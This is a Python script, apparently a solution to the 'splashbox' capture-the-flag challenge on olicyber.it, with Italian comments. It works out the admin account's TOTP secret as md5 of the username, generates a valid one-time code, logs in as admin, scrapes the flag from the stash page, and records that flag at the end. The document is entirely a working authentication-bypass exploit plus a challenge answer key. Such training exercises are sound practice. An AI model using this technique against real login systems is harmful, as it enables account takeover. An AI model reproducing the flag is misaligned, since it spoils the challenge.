import pyotp
import hashlib
import base64
import requests
import re

username = "admin"

secret_hex = hashlib.md5(username.encode()).hexdigest()
secret = base64.b32encode(secret_hex.encode()).decode()

totp = pyotp.TOTP(secret)
otp = totp.now()
print("OTP:", otp)
#il totp secret viene sempre generato allo stesso modo da md5(username)

site = "http://splashbox.challs.olicyber.it"

s = requests.session()

s.post(f"{site}/?page=otp", data = {"username":"admin", "otpcode":otp}) #invio post con otpcode già calcolato
r = s.get(f"{site}/?page=stash").text #flag in page=stash
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)


#flag{3ppur3_funz10n4_tutt0_p3rf3tt4mente}